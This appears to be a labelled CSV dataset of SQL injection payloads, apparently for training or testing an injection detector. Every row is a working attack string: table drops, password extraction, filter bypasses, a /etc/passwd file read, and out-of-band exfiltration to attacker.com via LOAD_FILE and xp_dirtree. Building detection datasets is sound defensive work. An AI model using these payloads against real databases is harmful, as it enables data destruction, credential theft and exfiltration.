Sentence,Label,Source,Type
'; DROP TABLE users; --,1,CVE_ExploitDB,stacked_drop
"'; INSERT INTO users VALUES('hacker','pw')--",1,CVE_ExploitDB,stacked_insert
1'; UPDATE users SET password='hacked' WHERE '1'='1,1,CVE_ExploitDB,stacked_update
'; EXEC('SELECT 1')--,1,CVE_ExploitDB,stacked_exec
1; SELECT * FROM users--,1,CVE_ExploitDB,stacked_select
"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",1,CVE_ExploitDB,oob_dns
'; EXEC master..xp_dirtree '//attacker.com/a'--,1,CVE_ExploitDB,oob_mssql
"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",1,CVE_ExploitDB,oob_file_read
admin'--,1,CVE_ExploitDB,second_order
admin'/*,1,CVE_ExploitDB,second_order
1' AND '1'='1,1,CVE_ExploitDB,second_order
'; SELECT ',1,CVE_ExploitDB,second_order
' UNION SELECT NULL--,1,template,union_column_enum
"' UNION SELECT NULL,NULL--",1,template,union_column_enum
"' UNION SELECT NULL,NULL,NULL--",1,template,union_column_enum
"' UNION SELECT NULL,NULL,NULL,NULL--",1,template,union_column_enum
"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",1,template,union_column_enum
"' UNION ALL SELECT NULL,NULL--",1,template,union_column_enum
"1 UNION SELECT @@version,NULL--",1,template,union_column_enum
"1 UNION SELECT user(),database()--",1,template,union_column_enum
"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",1,template,union_column_enum
"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",1,template,union_column_enum
' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,1,template,blind_boolean_advanced
"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",1,template,blind_boolean_advanced
1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0,1,template,blind_boolean_advanced
"' AND ORD(MID(password,1,1))>64 AND '1'='1",1,template,blind_boolean_advanced
"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1",1,template,blind_boolean_advanced
' oR '1'='1,1,template,filter_bypass
' Or '1'='1,1,template,filter_bypass
' OR/**/'1'='1,1,template,filter_bypass
' /*!OR*/ '1'='1,1,template,filter_bypass
' %4fR '1'='1,1,template,filter_bypass
' %6fR '1'='1,1,template,filter_bypass
"1 UN/**/ION SEL/**/ECT NULL,NULL--",1,template,filter_bypass
"1 /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL--",1,template,filter_bypass
"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,template,error_fingerprint
"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",1,template,error_fingerprint
"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",1,template,error_fingerprint
"' PROCEDURE ANALYSE(EXTRACTVALUE(rand(),CONCAT(0x3a,version())),1)--",1,template,error_fingerprint
